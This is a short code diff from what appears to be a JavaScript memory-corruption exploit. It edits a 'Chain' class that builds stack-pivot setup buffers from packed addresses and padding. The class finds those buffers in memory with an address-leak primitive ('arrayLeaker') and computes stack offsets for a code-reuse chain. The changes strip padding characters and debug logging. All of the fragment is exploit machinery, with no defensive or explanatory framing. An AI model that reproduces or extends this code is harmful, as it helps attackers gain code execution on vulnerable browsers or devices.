@@ -50,13 +50,12 @@ class Chain {
 	///////////////////////////////////////
 	
 	setup2Make(addr) {
-		return Util.pad(0x30, unescape("\u5332"))
+		return Util.pad(0x30)
 			+ Util.int32(addr);
 	}
 	
 	setup1Make(addr) {		
-		return Util.int32(addr)
-			+ Util.pad(0x30, unescape("\u5331"));
+		return Util.int32(addr);
 	}
 	
 	prepare(arrayLeaker) {	
@@ -75,14 +74,12 @@ class Chain {
 		var setup2 = this.setup2Make(addrStack + chainStackOffset);
 		var addrSetup2 = arrayLeaker.getAddress(setup2);
 		if (addrSetup2 === null) {
-			logger.debug("addrStack 0x${addrStack.toString(16)}");
 			throw new Error("Failed to get setup2 address.");
 		}
 		
 		var setup1 = this.setup1Make(addrSetup2);
 		var addrSetup1 = arrayLeaker.getAddress(setup1);
 		if (addrSetup1 === null) {
-			logger.debug(`addrSetup2 0x${addrSetup2.toString(16)}`);
 			throw new Error("Failed to get setup1 address.");
 		}
 		
